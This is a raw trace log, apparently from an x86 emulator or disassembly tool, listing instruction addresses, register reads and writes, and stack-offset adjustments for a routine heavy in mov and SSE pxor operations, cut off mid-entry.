() adjusting stack for ESP 0x0 and offset 0x7ecc for stack size 0x10000 saving data to stack: 0 4 0x42e580: mov dword ptr [ebp - 0x11c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee4 for stack size 0x10000 saving data to stack: 0 4 0x42e586: mov dword ptr [ebp - 0x130], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed0 for stack size 0x10000 saving data to stack: 0 4 0x42e59e: mov dword ptr [ebp - 0x138], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec8 for stack size 0x10000 saving data to stack: 0 4 0x42e5a4: mov eax, dword ptr [ebp - 0xa4], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f5c for stack size 0x10000 0x42e5b0: mov ebx, dword ptr [ebp - 0xe8], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 0x42e5b6: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42e5c1: mov edx, dword ptr [ebp - 0xa0], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f60 for stack size 0x10000 0x42e5cc: mov esi, dword ptr [ebp - 0x118], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 0x42e5d8: mov edx, esi, regs_read: [29], regs_write: [24] 0x42e5da: mov dword ptr [ebp - 0x118], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x42e5e6: mov esi, edi, regs_read: [23], regs_write: [29] 0x42e5f6: mov dword ptr [ebp - 0x144], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ebc for stack size 0x10000 saving data to stack: 0 4 0x42e5fc: mov esi, dword ptr [ebp - 0xa4], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f5c for stack size 0x10000 0x42e610: mov dword ptr [ebp - 0xe8], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42e624: mov dword ptr [ebp - 0x90], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x42e62c: mov eax, esi, regs_read: [29], regs_write: [19] 0x42e62e: mov dword ptr [ebp - 0xc4], esi, regs_read: [20, 29], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f3c for stack size 0x10000 saving data to stack: 0 4 0x42e639: mov ecx, dword ptr [ebp - 0x118], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 0x42e646: mov dword ptr [ebp - 0x120], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee0 for stack size 0x10000 saving data to stack: 0 4 0x42e64c: mov dword ptr [ebp - 0x10c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ef4 for stack size 0x10000 saving data to stack: 0 4 0x42e652: mov ebx, ecx, regs_read: [22], regs_write: [21] 0x42e662: mov ecx, dword ptr [ebp - 0xd8], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7f28 for stack size 0x10000 0x42e66a: mov dword ptr [ebp - 0xa4], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f5c for stack size 0x10000 saving data to stack: 0 4 0x42e670: mov dword ptr [ebp - 0x13c], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ec4 for stack size 0x10000 saving data to stack: 0 4 0x42e678: mov edx, dword ptr [ebp - 0x140], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7ec0 for stack size 0x10000 0x42e690: mov dword ptr [ebp - 0xe8], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42e696: mov eax, dword ptr [ebp - 0xcc], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f34 for stack size 0x10000 0x42e6a2: mov dword ptr [ebp - 0x144], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ebc for stack size 0x10000 saving data to stack: 0 4 0x42e6b1: mov ebx, dword ptr [ebp - 0x98], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 0x42e6c2: mov dword ptr [ebp - 0x98], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 saving data to stack: 0 4 0x42e6c8: mov edx, ebx, regs_read: [21], regs_write: [24] 0x42e6ca: mov esi, edi, regs_read: [23], regs_write: [29] 0x42e6d2: mov ebx, dword ptr [ebp - 0xcc], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f34 for stack size 0x10000 0x42e6e6: mov dword ptr [ebp - 0xcc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f34 for stack size 0x10000 saving data to stack: 0 4 0x42e6ef: mov dword ptr [ebp - 0x8c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 saving data to stack: 0 4 0x42e6f5: mov ebx, dword ptr [ebp - 0xd8], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f28 for stack size 0x10000 0x42e706: mov dword ptr [ebp - 0xd8], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f28 for stack size 0x10000 saving data to stack: 0 4 0x42e714: mov dword ptr [ebp - 0xdc], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f24 for stack size 0x10000 saving data to stack: 0 4 0x42e71a: mov ebx, dword ptr [ebp - 0xd8], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f28 for stack size 0x10000 0x42e726: mov ebx, dword ptr [ebp - 0xdc], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f24 for stack size 0x10000 0x42e72e: mov dword ptr [ebp - 0x118], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x42e734: mov ebx, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 0x42e73c: mov eax, dword ptr [ebp - 0x118], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 0x42e745: mov dword ptr [ebp - 0x118], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 saving data to stack: 0 4 0x42e758: mov dword ptr [ebp - 0x12c], ebx, regs_read: [20, 21], regs_write: () adjusting stack for ESP 0x0 and offset 0x7ed4 for stack size 0x10000 saving data to stack: 0 4 0x42e75e: mov ebx, dword ptr [ebp - 0x98], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f68 for stack size 0x10000 0x42e764: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42e774: mov dword ptr [ebp - 0x104], eax, regs_read: [20, 19], regs_write: () adjusting stack for ESP 0x0 and offset 0x7efc for stack size 0x10000 saving data to stack: 0 4 0x42e77a: mov edi, dword ptr [ebp - 0xec], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7f14 for stack size 0x10000 0x42e780: mov dword ptr [ebp - 0x100], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 saving data to stack: 0 4 0x42e786: mov ecx, eax, regs_read: [19], regs_write: [22] 0x42e788: mov eax, dword ptr [ebp - 0x100], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7f00 for stack size 0x10000 0x42e790: mov edx, dword ptr [ebp - 0x148], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7eb8 for stack size 0x10000 0x42e79e: mov edi, dword ptr [ebp - 0x144], regs_read: [20], regs_write: [23] adjusting stack for ESP 0x0 and offset 0x7ebc for stack size 0x10000 0x42e7ad: mov ebx, dword ptr [ebp - 0xe8], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f18 for stack size 0x10000 0x42e7c7: mov esi, dword ptr [ebp - 0x8c], regs_read: [20], regs_write: [29] adjusting stack for ESP 0x0 and offset 0x7f74 for stack size 0x10000 0x42e7cf: mov dword ptr [edx], ebx, regs_read: [24, 21], regs_write: () 0x42e7d7: mov ebx, edx, regs_read: [24], regs_write: [21] 0x42e7df: mov dword ptr [ebx + 4], edi, regs_read: [21, 23], regs_write: () 0x42e7e2: mov edi, edx, regs_read: [24], regs_write: [23] 0x42e7e4: mov edx, dword ptr [ebp - 0xdc], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f24 for stack size 0x10000 0x42e7ea: mov ebx, dword ptr [ebp - 0x12c], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7ed4 for stack size 0x10000 0x42e7fc: mov dword ptr [edi + 0xc], eax, regs_read: [23, 19], regs_write: () 0x42e7ff: mov eax, dword ptr [ebp - 0x10c], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7ef4 for stack size 0x10000 0x42e811: mov dword ptr [edi + 8], ecx, regs_read: [23, 22], regs_write: () 0x42e814: mov ecx, dword ptr [ebp - 0x120], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ee0 for stack size 0x10000 0x42e826: mov dword ptr [edi + 0x14], eax, regs_read: [23, 19], regs_write: () 0x42e829: mov eax, dword ptr [ebp - 0x118], regs_read: [20], regs_write: [19] adjusting stack for ESP 0x0 and offset 0x7ee8 for stack size 0x10000 0x42e83b: mov dword ptr [edi + 0x10], ecx, regs_read: [23, 22], regs_write: () 0x42e83e: mov ecx, esi, regs_read: [29], regs_write: [22] 0x42e844: mov dword ptr [edi + 0x18], eax, regs_read: [23, 19], regs_write: () 0x42e850: mov dword ptr [edi + 0x1c], ebx, regs_read: [23, 21], regs_write: () 0x42e86d: mov esi, edi, regs_read: [23], regs_write: [29] 0x42e86f: mov ebx, dword ptr [ebp - 0x94], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f6c for stack size 0x10000 0x42e875: mov edx, dword ptr [ebp - 0xf8], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f08 for stack size 0x10000 0x42e87b: mov dword ptr [edi + 0x20], ecx, regs_read: [23, 22], regs_write: () 0x42e87e: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42e887: mov dword ptr [edi + 0x24], eax, regs_read: [23, 19], regs_write: () 0x42e8aa: mov ebx, dword ptr [ebp - 0x88], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f78 for stack size 0x10000 0x42e8b0: mov edx, dword ptr [ebp - 0xd4], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f2c for stack size 0x10000 0x42e8b6: mov dword ptr [edi + 0x28], ecx, regs_read: [23, 22], regs_write: () 0x42e8b9: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42e8c2: mov dword ptr [edi + 0x2c], eax, regs_read: [23, 19], regs_write: () 0x42e8e5: mov ebx, dword ptr [ebp - 0xc4], regs_read: [20], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x7f3c for stack size 0x10000 0x42e8eb: mov edx, dword ptr [ebp - 0x90], regs_read: [20], regs_write: [24] adjusting stack for ESP 0x0 and offset 0x7f70 for stack size 0x10000 0x42e8f1: mov dword ptr [esi + 0x30], ecx, regs_read: [29, 22], regs_write: () 0x42e8f4: mov ecx, ebx, regs_read: [21], regs_write: [22] 0x42e8fa: mov dword ptr [esi + 0x34], eax, regs_read: [29, 19], regs_write: () 0x42e920: mov dword ptr [esi + 0x38], ecx, regs_read: [29, 22], regs_write: () 0x42e923: mov ecx, dword ptr [ebp - 4], regs_read: [20], regs_write: [22] adjusting stack for ESP 0x0 and offset 0x7ffc for stack size 0x10000 0x42e926: pop edi, regs_read: [30], regs_write: [30, 23] 0x42e927: mov dword ptr [esi + 0x3c], eax, regs_read: [29, 19], regs_write: () 0x42e92c: pop esi, regs_read: [30], regs_write: [30, 29] 0x42e92f: pop ebx, regs_read: [30], regs_write: [30, 21] 0x42e935: mov esp, ebp, regs_read: [20], regs_write: [30] adjusting stack for ESP 0xc and offset 0x8000 for stack size 0x10000 0x42e937: pop ebp, regs_read: [30], regs_write: [30, 20] 0x42e940: push ebx, regs_read: [30, 21], regs_write: [30] 0x42e941: mov ebx, esp, regs_read: [30], regs_write: [21] adjusting stack for ESP 0x0 and offset 0x8000 for stack size 0x10000 0x42e94c: push ebp, regs_read: [30, 20], regs_write: [30] 0x42e94d: mov ebp, dword ptr [ebx + 4], regs_read: [21], regs_write: [20] 0x42e950: mov dword ptr [esp + 4], ebp, regs_read: [30, 20], regs_write: () adjusting stack for ESP -0x4 and offset 0x8004 for stack size 0x10000 saving data to stack: 0 4 0x42e954: mov ebp, esp, regs_read: [30], regs_write: [20] adjusting stack for ESP -0x4 and offset 0x8000 for stack size 0x10000 0x42e95c: mov eax, dword ptr [ebx + 0xc], regs_read: [21], regs_write: [19] 0x42e95f: push esi, regs_read: [30, 29], regs_write: [30] 0x42e960: push edi, regs_read: [30, 23], regs_write: [30] 0x42e961: mov ecx, dword ptr [eax], regs_read: [19], regs_write: [22] 0x42e963: mov dword ptr [ebp - 0x8c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f74 for stack size 0x10000 saving data to stack: 0 4 0x42e969: mov ecx, dword ptr [eax + 4], regs_read: [19], regs_write: [22] 0x42e96c: mov dword ptr [ebp - 0x88], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f78 for stack size 0x10000 saving data to stack: 0 4 0x42e972: mov ecx, dword ptr [eax + 8], regs_read: [19], regs_write: [22] 0x42e975: mov dword ptr [ebp - 0x7c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f84 for stack size 0x10000 saving data to stack: 0 4 0x42e978: mov ecx, dword ptr [eax + 0xc], regs_read: [19], regs_write: [22] 0x42e97b: mov dword ptr [ebp - 0x78], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f88 for stack size 0x10000 saving data to stack: 0 4 0x42e97e: mov ecx, dword ptr [eax + 0x10], regs_read: [19], regs_write: [22] 0x42e981: mov dword ptr [ebp - 0x48], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb8 for stack size 0x10000 saving data to stack: 0 4 0x42e984: mov ecx, dword ptr [eax + 0x14], regs_read: [19], regs_write: [22] 0x42e987: mov dword ptr [ebp - 0x44], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fbc for stack size 0x10000 saving data to stack: 0 4 0x42e98a: mov ecx, dword ptr [eax + 0x18], regs_read: [19], regs_write: [22] 0x42e98d: mov dword ptr [ebp - 0xc8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f38 for stack size 0x10000 saving data to stack: 0 4 0x42e993: mov ecx, dword ptr [eax + 0x1c], regs_read: [19], regs_write: [22] 0x42e996: mov dword ptr [ebp - 0xe4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f1c for stack size 0x10000 saving data to stack: 0 4 0x42e99c: mov ecx, dword ptr [eax + 0x20], regs_read: [19], regs_write: [22] 0x42e99f: mov dword ptr [ebp - 0xcc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f34 for stack size 0x10000 saving data to stack: 0 4 0x42e9a5: mov ecx, dword ptr [eax + 0x24], regs_read: [19], regs_write: [22] 0x42e9a8: mov dword ptr [ebp - 0xf4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f0c for stack size 0x10000 saving data to stack: 0 4 0x42e9ae: mov ecx, dword ptr [eax + 0x28], regs_read: [19], regs_write: [22] 0x42e9b1: mov edi, dword ptr [eax + 0x58], regs_read: [19], regs_write: [23] 0x42e9b4: mov dword ptr [ebp - 0xd8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f28 for stack size 0x10000 saving data to stack: 0 4 0x42e9ba: mov ecx, dword ptr [eax + 0x2c], regs_read: [19], regs_write: [22] 0x42e9bd: mov dword ptr [ebp - 0xe8], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f18 for stack size 0x10000 saving data to stack: 0 4 0x42e9c3: mov ecx, dword ptr [eax + 0x30], regs_read: [19], regs_write: [22] 0x42e9d0: mov dword ptr [ebp - 0x84], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f7c for stack size 0x10000 saving data to stack: 0 4 0x42e9d6: mov ecx, dword ptr [eax + 0x34], regs_read: [19], regs_write: [22] 0x42e9e9: mov dword ptr [ebp - 0x80], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f80 for stack size 0x10000 saving data to stack: 0 4 0x42e9ec: mov ecx, dword ptr [eax + 0x38], regs_read: [19], regs_write: [22] 0x42e9ef: mov dword ptr [ebp - 0xf0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f10 for stack size 0x10000 saving data to stack: 0 4 0x42e9f5: mov ecx, dword ptr [eax + 0x3c], regs_read: [19], regs_write: [22] 0x42e9f8: mov esi, dword ptr [eax + 0x5c], regs_read: [19], regs_write: [29] 0x42e9fb: mov edx, dword ptr [eax + 0x70], regs_read: [19], regs_write: [24] 0x42e9fe: mov dword ptr [ebp - 0xec], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f14 for stack size 0x10000 saving data to stack: 0 4 0x42ea04: mov ecx, dword ptr [eax + 0x40], regs_read: [19], regs_write: [22] 0x42ea07: mov dword ptr [ebp - 0xdc], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f24 for stack size 0x10000 saving data to stack: 0 4 0x42ea0d: mov ecx, dword ptr [eax + 0x44], regs_read: [19], regs_write: [22] 0x42ea10: mov dword ptr [ebp - 0xe0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f20 for stack size 0x10000 saving data to stack: 0 4 0x42ea16: mov ecx, dword ptr [eax + 0x48], regs_read: [19], regs_write: [22] 0x42ea19: mov dword ptr [ebp - 0x74], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f8c for stack size 0x10000 saving data to stack: 0 4 0x42ea1c: mov ecx, dword ptr [eax + 0x4c], regs_read: [19], regs_write: [22] 0x42ea1f: mov dword ptr [ebp - 0xc4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f3c for stack size 0x10000 saving data to stack: 0 4 0x42ea25: mov ecx, dword ptr [eax + 0x50], regs_read: [19], regs_write: [22] 0x42ea28: mov dword ptr [ebp - 0xd0], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f30 for stack size 0x10000 saving data to stack: 0 4 0x42ea2e: mov ecx, dword ptr [eax + 0x54], regs_read: [19], regs_write: [22] 0x42ea31: mov dword ptr [ebp - 0x1e4], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7e1c for stack size 0x10000 saving data to stack: 0 4 0x42ea37: mov edi, dword ptr [eax + 0x78], regs_read: [19], regs_write: [23] 0x42ea3a: mov dword ptr [ebp - 0xd4], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f2c for stack size 0x10000 saving data to stack: 0 4 0x42ea40: mov ecx, dword ptr [eax + 0x60], regs_read: [19], regs_write: [22] 0x42ea43: mov dword ptr [ebp - 0x114], edi, regs_read: [20, 23], regs_write: () adjusting stack for ESP -0xc and offset 0x7eec for stack size 0x10000 saving data to stack: 0 4 0x42ea49: mov edi, dword ptr [ebx + 8], regs_read: [21], regs_write: [23] 0x42ea4c: mov dword ptr [ebp - 0x94], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f6c for stack size 0x10000 saving data to stack: 0 4 0x42ea52: mov ecx, dword ptr [eax + 0x64], regs_read: [19], regs_write: [22] 0x42ea5c: mov dword ptr [ebp - 0x90], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7f70 for stack size 0x10000 saving data to stack: 0 4 0x42ea62: mov ecx, dword ptr [eax + 0x68], regs_read: [19], regs_write: [22] 0x42ea69: mov dword ptr [ebp - 0x50], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb0 for stack size 0x10000 saving data to stack: 0 4 0x42ea6c: mov ecx, dword ptr [eax + 0x6c], regs_read: [19], regs_write: [22] 0x42ea73: mov dword ptr [ebp - 0x4c], ecx, regs_read: [20, 22], regs_write: () adjusting stack for ESP -0xc and offset 0x7fb4 for stack size 0x10000 saving data to stack: 0 4 0x42ea76: mov ecx, dword ptr [eax + 0x74], regs_read: [19], regs_write: [22] 0x42ea79: mov eax, dword ptr [eax + 0x7c], regs_read: [19], regs_write: [19] 0x42eaa1: movaps xmmword ptr [ebp - 0x230], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7dd0 for stack size 0x10000 saving data to stack: 0 16 0x42eaa8: movaps xmmword ptr [ebp - 0x1d0], xmm3, regs_read: [20, 125], regs_write: () adjusting stack for ESP -0xc and offset 0x7e30 for stack size 0x10000 saving data to stack: 0 16 0x42eac3: pxor xmm0, xmmword ptr [0x4c9d20], regs_read: [122], regs_write: [122] adjusting stack for ESP -0xc and offset 0x4d1d20 for stack size 0x10000 0x42eacb: pxor xmm0, xmm3, regs_read: [122, 125], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42eae4: movaps xmmword ptr [ebp - 0x200], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e00 for stack size 0x10000 saving data to stack: 0 16 0x42eaef: pxor xmm0, xmmword ptr [0x4c9d30], regs_read: [122], regs_write: [122] adjusting stack for ESP -0xc and offset 0x4d1d30 for stack size 0x10000 0x42eaf7: movaps xmm4, xmmword ptr [0x4c9d00], regs_read: (), regs_write: [126] 0x42eafe: pxor xmm0, xmm7, regs_read: [122, 129], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42eb02: movaps xmm5, xmmword ptr [0x4c9d10], regs_read: (), regs_write: [127] 0x42eb12: movaps xmm6, xmm4, regs_read: [126], regs_write: [128] 0x42eb1d: movaps xmmword ptr [ebp - 0x150], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x42eb29: pxor xmm6, xmm0, regs_read: [128, 122], regs_write: [128] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42eb3a: movaps xmmword ptr [ebp - 0x140], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x42eb41: movaps xmm3, xmm5, regs_read: [127], regs_write: [125] 0x42eb49: pxor xmm3, xmm0, regs_read: [125, 122], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42eb62: movaps xmmword ptr [ebp - 0x160], xmm2, regs_read: [20, 124], regs_write: () adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 saving data to stack: 0 16 0x42eb89: movaps xmm0, xmm4, regs_read: [126], regs_write: [122] 0x42eb98: movaps xmmword ptr [ebp - 0x1e0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e20 for stack size 0x10000 saving data to stack: 0 16 0x42eba7: movaps xmmword ptr [ebp - 0x1c0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 saving data to stack: 0 16 0x42ebbe: movaps xmmword ptr [ebp - 0x210], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7df0 for stack size 0x10000 saving data to stack: 0 16 0x42ebc5: movaps xmm0, xmmword ptr [ebp - 0x210], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7df0 for stack size 0x10000 0x42ebd0: movaps xmm1, xmmword ptr [ebp - 0x160], regs_read: [20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 0x42ebd7: pxor xmm1, xmmword ptr [ebp - 0x1c0], regs_read: [123, 20], regs_write: [123] adjusting stack for ESP -0xc and offset 0x7e40 for stack size 0x10000 0x42ebe8: movaps xmmword ptr [ebp - 0x210], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7df0 for stack size 0x10000 saving data to stack: 0 16 0x42ebf3: movaps xmm7, xmmword ptr [ebp - 0x150], regs_read: [20], regs_write: [129] adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 0x42ebfe: pxor xmm7, xmm0, regs_read: [129, 122], regs_write: [129] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ec02: movaps xmmword ptr [ebp - 0x1d0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7e30 for stack size 0x10000 saving data to stack: 0 16 0x42ec12: movaps xmm0, xmm1, regs_read: [123], regs_write: [122] 0x42ec15: movaps xmmword ptr [ebp - 0x160], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 saving data to stack: 0 16 0x42ec24: movaps xmm1, xmm7, regs_read: [129], regs_write: [123] 0x42ec27: movaps xmmword ptr [ebp - 0x220], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7de0 for stack size 0x10000 saving data to stack: 0 16 0x42ec32: pxor xmm0, xmm6, regs_read: [122, 128], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ec36: movaps xmmword ptr [ebp - 0x140], xmm1, regs_read: [20, 123], regs_write: () adjusting stack for ESP -0xc and offset 0x7ec0 for stack size 0x10000 saving data to stack: 0 16 0x42ec3d: pxor xmm1, xmm3, regs_read: [123, 125], regs_write: [123] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ec41: movaps xmmword ptr [ebp - 0x150], xmm7, regs_read: [20, 129], regs_write: () adjusting stack for ESP -0xc and offset 0x7eb0 for stack size 0x10000 saving data to stack: 0 16 0x42ec48: movaps xmm2, xmm0, regs_read: [122], regs_write: [124] 0x42ec4b: movaps xmm4, xmm1, regs_read: [123], regs_write: [126] 0x42ec60: pxor xmm2, xmm0, regs_read: [124, 122], regs_write: [124] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ec64: pxor xmm4, xmm1, regs_read: [126, 123], regs_write: [126] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ec68: movaps xmm0, xmm2, regs_read: [124], regs_write: [122] 0x42ec73: movaps xmm3, xmm7, regs_read: [129], regs_write: [125] 0x42ec84: movaps xmmword ptr [ebp - 0x1b0], xmm0, regs_read: [20, 122], regs_write: () adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 saving data to stack: 0 16 0x42ec97: movaps xmm5, xmmword ptr [ebp - 0x160], regs_read: [20], regs_write: [127] adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 0x42ecbc: movaps xmm7, xmm6, regs_read: [128], regs_write: [129] 0x42eccb: mov edi, dword ptr [ebp - 0x1e4], regs_read: [20], regs_write: [23] adjusting stack for ESP -0xc and offset 0x7e1c for stack size 0x10000 0x42ecd1: movaps xmmword ptr [ebp - 0x1a0], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7e60 for stack size 0x10000 saving data to stack: 0 16 0x42ecf0: movaps xmm0, xmmword ptr [ebp - 0x1b0], regs_read: [20], regs_write: [122] adjusting stack for ESP -0xc and offset 0x7e50 for stack size 0x10000 0x42ecfb: movaps xmmword ptr [ebp - 0x240], xmm6, regs_read: [20, 128], regs_write: () adjusting stack for ESP -0xc and offset 0x7dc0 for stack size 0x10000 saving data to stack: 0 16 0x42ed02: movaps xmm6, xmm4, regs_read: [126], regs_write: [128] 0x42ed21: pxor xmm3, xmm6, regs_read: [125, 128], regs_write: [125] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ed25: movaps xmmword ptr [ebp - 0x250], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7db0 for stack size 0x10000 saving data to stack: 0 16 0x42ed2c: pxor xmm5, xmm7, regs_read: [127, 129], regs_write: [127] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ed35: movaps xmmword ptr [ebp - 0x160], xmm4, regs_read: [20, 126], regs_write: () adjusting stack for ESP -0xc and offset 0x7ea0 for stack size 0x10000 saving data to stack: 0 16 0x42ed44: pxor xmm0, xmm4, regs_read: [122, 126], regs_write: [122] adjusting stack for ESP -0xc and offset 0x8000 for stack size 0x10000 0x42ed56: movaps xmm3, xmm1, regs_read: 